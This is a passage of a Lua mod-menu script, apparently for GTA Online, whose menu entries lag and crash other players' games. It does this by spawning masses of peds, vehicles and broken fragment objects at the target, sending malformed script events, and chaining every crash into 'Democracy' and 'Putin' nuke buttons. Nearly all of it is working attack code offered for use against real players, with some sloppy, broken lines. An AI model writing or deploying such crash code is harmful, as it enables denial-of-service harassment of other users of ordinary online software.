                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                    "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
                )
                menu.set_value(freeze_toggle, false)
            end
        end)
    
        FearLagPlayer:toggle_loop("Standard Lag "..FearPlayerName, {'fearlag2'}, "Freeze "..FearPlayerName.." To Make Work.", function()
            if players.exists(pid) then
                local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
                local player_pos = players.get_position(pid)
                menu.set_value(freeze_toggle, true)
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                    "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
                )
                menu.set_value(freeze_toggle, false)
            end
        end)
    
        FearLagPlayer:toggle_loop("Smoke Lag "..FearPlayerName, {'fearlag3'}, "Freeze "..FearPlayerName.." To Make Work.", function()
            if players.exists(pid) then
                local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
                local player_pos = players.get_position(pid)
                menu.set_value(freeze_toggle, true)
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                    "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
                )
                menu.set_value(freeze_toggle, false)
            end
        end)
    
        FearLagPlayer:toggle_loop("Small Smoke Lag "..FearPlayerName, {'fearlag4'}, "Freeze "..FearPlayerName.." To Make Work.", function()
            if players.exists(pid) then
                local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
                local player_pos = players.get_position(pid)
                menu.set_value(freeze_toggle, true)
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                    "ent_anim_bm_water_mist", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
                )
                menu.set_value(freeze_toggle, false)
            end
        end)

        ----===========================----
        --- Crash Players with features
        ----===========================----

        FearCrashTool:divider("FearCrash Tool Advanced ")

        FearCrashTool:action("Standard Crash", {"fearcrash1"}, "Crash only first time", function()
            local mdl = util.joaat('a_c_poodle')
            Fear.BlockSyncs(pid, function()
                if Fear.request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(100)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1500)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                    entities.delete_by_handle(ped1)
                    util.yield(1000)
                else
                    util.toast("Error loading model.")
                end
            end)
        end)

        FearCrashTool:action("Explosive Crash", {"fearcrashcar"}, "", function(on_toggle)
            local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
            local vehicles = {}
            for i = 1, 4 do
                util.create_thread(function()
                    Fear.request_model(hashes[i])
                    local pcoords = players.get_position(pid)
                    local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
                    for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
                    VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                    for j = 0, 49 do
                        local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                        VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                        VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
                    end
                    for j = 0, 20 do
                        if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
                    end
                    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
                    VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
                    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
                    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
                    for ai = 1, 50 do
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                        pcoords = players.get_position(pid)
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                        util.yield()
                    end
                    vehicles[#vehicles+1] = veh
                end)
            end
            util.yield(2000)
            for _, v in pairs(vehicles) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
                entities.delete_by_handle(v)
            end
        end)

        FearCrashTool:action("Invaild Model", {"fearinvalid1"}, "", function()
            Fear.BlockSyncs(pid, function()
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                util.yield(1000)
                entities.delete_by_handle(object)
            end)
        end)

        FearCrashTool:action("Invaild Model 2nd Time", {"fearinvalid2"}, "", function()
            Fear.BlockSyncs(player_id, function()
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                util.yield(1000)
                entities.delete_by_handle(object)
            end)
        end)

        FearCrashTool:action("Invaild Model 3rd Time", {"fearinvalid3"}, "", function()
            local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local hash = util.joaat("cs_taostranslator2")
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                STREAMING.REQUEST_MODEL(hash)
                util.yield(5)
            end
            local ped = {}
            for i = 0, 10 do
                local coord = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
                ped[i] = entities.create_ped(0, hash, coord, 0)
                local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
                WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
                menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(pid) .. " explode " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
                ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
            util.yield(25)
            end
            util.yield(2500)
            for i = 0, 10 do
                entities.delete_by_handle(ped[i])
                util.yield(10)
            end
        end)

        FearCrashTool:action("Invaild Model 4th Time", {"fearinvalid4"}, "", function(on_toggle)
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                for i = 0, 100 do 
                    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                util.yield(10)
                entities.delete_by_handle(Object_pizza2)
                entities.delete_by_handle(Object_pizza2)
                entities.delete_by_handle(Object_pizza2)
                entities.delete_by_handle(Object_pizza2)
                return
            end
        end)

        FearCrashTool:action("Invalid Model 5th Time", {"fearinvalid5"}, "Skid from x-force", function()
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = players.get_position(pid)
            local mdl = util.joaat("u_m_m_jesus_01")
            local veh_mdl = util.joaat("oppressor")
            util.request_model(veh_mdl)
            util.request_model(mdl)
                for i = 1, 10 do
                if not players.exists(pid) then
                    return
                end
                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                util.yield(1000)
                entities.delete_by_handle(jesus)
                entities.delete_by_handle(veh)
            end
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        end)
        FearCrashTool:action("Invalid Model 6th Time", {"fearinvalid6"}, "X-Force features Crash", function()
            local int_min = -2147483647
            local int_max = 2147483647
                for i = 1, 15 do
                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                end
                util.yield()
                for i = 1, 15 do
                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                end
                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end)
        FearCrashTool:action("Invalid Model 7th Time", {"fearinvalid7"}, "Crash from X-Force", function()
            local int_min = -2147483647
            local int_max = 2147483647
                for i = 1, 15 do
                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
                end
                util.yield()
                for i = 1, 15 do
                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, pid, math.random(int_min, int_max)})
                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
                end
                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
        end)
    
        local pclpid = {}
    
        FearCrashTool:action("Invalid Model 8th Time", {"fearinvalid8"}, "Clones the player causing (XC)", function()
            local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local c = ENTITY.GET_ENTITY_COORDS(p)
            for i = 1, 25 do
                local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
                pclpid [#pclpid + 1] = pclone 
                PED.CLONE_PED_TO_TARGET(p, pclone)
            end
            local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
            all_peds = entities.get_all_peds_as_handles()
            local last_ped = 0
            local last_ped_ht = 0
            for k,ped in pairs(all_peds) do
                if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                    Fear.get_control_request(ped)
                    if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                    end
        
                    ENTITY.DETACH_ENTITY(ped, false, false)
                    if last_ped ~= 0 then
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
                    else
                        ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                    end
                    last_ped = ped
                end
            end
        end, nil, nil, COMMANDPERM_AGGRESSIVE)

        FearCrashTool:action("Smoke Crash", {"fearsmoke"}, "", function(on_loop)
            local cord = players.get_position(pid)
            local a1 = entities.create_object(-930879665, cord)
            local a2 = entities.create_object(3613262246, cord)
            local b1 = entities.create_object(452618762, cord)
            local b2 = entities.create_object(3613262246, cord)
            for i = 1, 10 do
                util.request_model(-930879665)
                util.yield(10)
                util.request_model(3613262246)
                util.yield(10)
                util.request_model(452618762)
                util.yield(300)
                entities.delete_by_handle(a1)
                entities.delete_by_handle(a2)
                entities.delete_by_handle(b1)
                entities.delete_by_handle(b2)
                util.request_model(452618762)
                util.yield(10)
                util.request_model(3613262246)
                util.yield(10)
                util.request_model(-930879665)
                util.yield(10)
            end
        end)

        FearCrashTool:action("Big Chungus Extreme", {"fearbigchungus"}, "Crash player with every each movement.\nBig Chungus can freeze your party lol.", function()
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
            local mdl = util.joaat("A_C_Cat_01")
            local mdl2 = util.joaat("U_M_Y_Zombie_01")
            local mdl3 = util.joaat("A_F_M_ProlHost_01")
            local mdl4 = util.joaat("A_M_M_SouCent_01")
            local veh_mdl = util.joaat("insurgent2")
            local veh_mdl2 = util.joaat("brawler")
            local animation_tonta = ("anim@mp_player_intupperstinker")
            Fear.anim_request(animation_tonta)
            util.request_model(veh_mdl)
            util.request_model(veh_mdl2)
            util.request_model(mdl)
            util.request_model(mdl2)
            util.request_model(mdl3)
            util.request_model(mdl4)
            for i = 1, 250 do
                local ped1 = entities.create_ped(1, mdl, pos, 0)
                local ped_ = entities.create_ped(1, mdl2, pos, 0)
                local ped3 = entities.create_ped(1, mdl3, pos, 0)
                local ped3 = entities.create_ped(1, mdl4, pos, 0)
                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                local veh2 = entities.create_vehicle(veh_mdl2, pos, 0)
                util.yield(100)
                PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
                PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
    
                PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
                PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
    
                PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
                PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
    
                PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
                PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
                
                PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
                PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)
    
                PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
                PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)
    
                TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
                TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
                TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
                TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
    
                TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
                TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
                TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
                TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)
    
                TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
                TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
                TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
                TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
    
                PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
                
                PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)
    
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
                TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, animation_tonta, 0, false)
    
                ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
                ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
                ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
                ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)
    
                PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
                PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
                TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
                PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
                PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
                TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
                util.yield(200)
                TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            end
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
            entities.delete_by_handle(mdl)
            entities.delete_by_handle(mdl2)
            entities.delete_by_handle(mdl3)
            entities.delete_by_handle(mdl4)
            entities.delete_by_handle(veh_mdl)
            entities.delete_by_handle(veh_mdl2)
        end)	

        ----===========================----
        --- Nuke Special Advanced Tools
        ----===========================----        

            local FearCrashExtreme = FearAttackList:list("Nuke Button", {}, "")
            FearCrashExtreme:divider("FearNuke Advanced")

            FearCrashExtreme:action("Democracy Button", {"fearamerica"}, "You really want crash "..FearPlayerName.." ?\nNOTE: Crash yourself you come back to the same thing, you crash your own game.\n\nMake sure you need a strong computer to last longer in crash tests.", function()
                menu.trigger_commands("anticrashcamera on")
                menu.trigger_commands("potatomode on")
                menu.trigger_commands("trafficpotato on")
                menu.trigger_commands("fearlag3"..players.get_name(pid))
                util.yield(2500)
                menu.trigger_commands("fearbigchungus"..players.get_name(pid))
                util.yield(2500)                    
                menu.trigger_commands("fearcrash1"..players.get_name(pid))
                util.yield(620) 
                menu.trigger_commands("fearinvalid5"..players.get_name(pid))
                util.yield(620)
                menu.trigger_commands("fearinvalid5"..players.get_name(pid))
                util.yield(620)
                menu.trigger_commands("fearinvalid6"..players.get_name(pid))
                util.yield(620)
                menu.trigger_commands("fearinvalid7"..players.get_name(pid))
                util.yield(620)
                menu.trigger_commands("fearinvalid4"..players.get_name(pid))
                util.yield(620)
                menu.trigger_commands("fearinvalid3"..players.get_name(pid))
                util.yield(620)
                menu.trigger_commands("fearcrashcar"..players.get_name(pid))
                util.yield(400)
                menu.trigger_commands("fearsmoke"..players.get_name(pid))
                util.yield(400)
                menu.trigger_commands("crash"..players.get_name(pid))
                util.yield(550)
                menu.trigger_commands("ngcrash"..players.get_name(pid))
                util.yield(550)
                menu.trigger_commands("footlettuce"..players.get_name(pid))
                util.yield(1800)
                menu.trigger_commands("fearlag3"..players.get_name(pid))
                menu.trigger_commands("cleararea")
                menu.trigger_commands("potatomode off")
                menu.trigger_commands("trafficpotato off")
                util.yield(8000)
                menu.trigger_commands("anticrashcamera off")
                FearToast(FearScriptNotif.."\n"..FearPlayerName.. " has been nuked by american hydrogen bomb Castle Bravo.")
            end)
        
            if menu.get_edition() >= 2 then
                FearCrashExtreme:action("Putin Button", {"fearputin"}, "You really want crash "..FearPlayerName.." ?\nNOTE: Crash yourself you come back to the same thing, you crash your own game.\n\nMake sure you need a strong computer to last longer in crash tests.", function()
                    local objective = pid
                    menu.trigger_commands("anticrashcamera on")
                    menu.trigger_commands("potatomode on")
                    menu.trigger_commands("trafficpotato on")
                    menu.trigger_commands("fearlag3"..players.get_name(pid))
                    util.yield(2500)
                    menu.trigger_commands("fearbigchungus"..players.get_name(pid)) -- Big Chungus Crash
                    util.yield(620)
                    menu.trigger_commands("fearinvalid8"..players.get_name(pid)) -- Invalid Model V8
                    util.yield(620)
                    menu.trigger_commands("fearinvalid7"..players.get_name(pid)) -- Invalid Model V7
                    util.yield(620)
                    menu.trigger_commands("fearinvalid6"..players.get_name(pid)) -- Invalid Model V6
                    util.yield(620)
                    menu.trigger_commands("fearinvalid5"..players.get_name(pid)) -- Invalid Model V5
                    util.yield(620)
                    menu.trigger_commands("fearinvalid4"..players.get_name(pid)) -- Invalid Model V4
                    util.yield(820)
                    menu.trigger_commands("fearinvalid3"..players.get_name(pid)) -- Invalid Model V3
                    util.yield(620)
                    menu.trigger_commands("fearinvalid2"..players.get_name(pid)) -- Invalid Model V2
                    util.yield(620)
                    menu.trigger_commands("fearinvalid1"..players.get_name(pid)) -- Invalid Model V1
                    util.yield(620)
                    menu.trigger_commands("fearcrash1"..players.get_name(pid)) -- Crash Model V1
                    util.yield(720)
                    menu.trigger_commands("fearcrashcar"..players.get_name(pid)) -- Cars Crash
                    util.yield(720)
                    menu.trigger_commands("fearsmoke"..players.get_name(pid)) -- Weed Crash
                    util.yield(2800)
                    menu.trigger_commands("crash"..players.get_name(pid))
                    util.yield(550)
                    menu.trigger_commands("ngcrash"..players.get_name(pid))
                    util.yield(550)
                    menu.trigger_commands("footlettuce"..players.get_name(pid))
                    util.yield(550)
                    menu.trigger_commands("steamroll"..players.get_name(pid))
                    util.yield(550)
                    menu.trigger_commands("choke"..players.get_name(pid))
                    util.yield(550)
                    menu.trigger_commands("flashcrash"..players.get_name(pid))
                    util.yield(200)
                    menu.trigger_commands("fearlag3"..players.get_name(pid))
                    menu.trigger_commands("cleararea")
                    menu.trigger_commands("potatomode off")
                    menu.trigger_commands("trafficpotato off")
                    util.yield(8000)
                    menu.trigger_commands("anticrashcamera off")
                    FearToast(FearScriptNotif.."\n"..FearPlayerName.. " has been nuked by the greatest president Vladimir Putin.\nThe End of the World has begun.")
                end)
            end

        ----============================----
        --- Standard Crash & Kick Player
        ----============================----        

